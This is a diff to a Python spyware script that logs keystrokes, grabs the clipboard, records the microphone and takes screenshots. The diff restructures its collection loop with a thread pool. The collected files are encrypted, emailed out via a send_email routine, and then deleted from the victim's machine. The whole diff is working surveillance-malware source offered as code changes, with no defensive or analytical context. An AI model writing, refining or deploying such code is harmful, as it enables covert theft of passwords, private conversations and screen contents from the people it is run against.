@@ -16,6 +16,7 @@ import time
 import os
 import shutil
 import threading
+import concurrent.futures
 from scipy.io.wavfile import write
 import sounddevice as sd
 from cryptography.fernet import Fernet
@@ -248,47 +249,49 @@ def on_press(key):
         count = 0
         write_file(keys)
         keys =[]
-        
+
+def on_release(key):
+    currentTime = time.time()
+    if currentTime > stoppingTime:
+        return False
+
+
+with open(file_path + extend + keys_information, "a") as f:
+    f.write("""KEY_LOGS\n----------",time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),"----------\n""")
+    f.close()
 
 count = 0
-threads = []
 keys = []
-encrypt_thread = threading.Thread(target=encryption)
-send_thread = threading.Thread(target=send_email,args=(encrypted_system_files, "LOG FILES", "Encrypted Files attached"))
 currentTime = time.time()
 stoppingTime = currentTime + time_iteration
+listener = Listener( on_press=on_press, on_release=on_release)
+listener.start()
 
 # timer
 while currentTime < stoppingTime:
-    
-    with Listener(on_press=on_press) as listener:
-        listener.join()
-        
-    if not encrypt_thread.is_alive(): 
-        threads.extend([threading.Thread(target=send_email,args=(encrypted_system_files, "LOG FILES", "Encrypted Files attached"))])
-        send_thread = threads[-1]
-        send_thread.start()
-        threads = []
-        threads.extend([ threading.Thread(target=copy_clipboard),
-                         threading.Thread(target=microphone),
-                         threading.Thread(target=screenshot)])
-        for thread in threads:
-            thread.start()
-        sent_done = True
-            
-    if all(not thread.is_alive() for thread in threads):    
-        if not send_thread.is_alive():
-            shutil.copyfile(file_merge + keys_information, file_merge + keys_send)
-            keys =[] 
-            with open(file_merge + keys_information, "w") as f:
-                f.write(" ")
-            threads.extend([threading.Thread(target=encryption)])
-            encrypt_thread = threads[-1]
-            encrypt_thread.start()
+    # Use ThreadPoolExecutor to execute functions
+    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
+        # Execute three functions simultaneously
+        futures = [executor.submit(copy_clipboard), executor.submit(microphone), executor.submit(screenshot)]
+
+        # Wait for the first three functions to complete
+        concurrent.futures.wait(futures)
+
+        # Execute the fourth function
+        shutil.copyfile(file_merge + keys_information, file_merge + keys_send)
+        keys =[] 
+        with open(file_merge + keys_information, "w") as f:
+            f.write(" ")
+        future4 = executor.submit(encryption)
+        future4.result()  # Wait for the fourth function to complete
+
+        # Execute the fifth function
+        future5 = executor.submit(send_email, send_file_names, "LOG FILES", "encrypted files attached")
+        future5.result()  # Wait for the fifth function to complete    
     
     currentTime = time.time()
+
                             
-send_thread.join()
 t3.join()
 delete_files =  system_files + encrypted_system_files + files_to_encrypt + send_file_names 
 for file in delete_files:
